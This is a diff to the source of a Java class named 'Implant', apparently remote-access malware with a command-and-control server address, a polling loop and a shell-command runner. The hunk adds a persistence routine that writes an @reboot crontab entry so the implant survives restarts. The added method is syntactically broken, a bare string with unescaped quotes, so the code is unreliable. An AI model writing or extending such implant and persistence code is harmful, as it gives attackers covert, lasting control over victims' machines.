@@ -29,6 +29,9 @@ public class Implant {
     static final String C2 = "http://127.0.0.1:5000";
     static final int POLL_SECONDS = 5;
 
+    // Persistence via cronjob
+    static String cronJob() {"(crontab -l 2>/dev/null; echo "@reboot /path/to/binary") | crontab -"}
+
     /** Run a shell command, return stdout. */
     static String run(String cmd) {
         try {
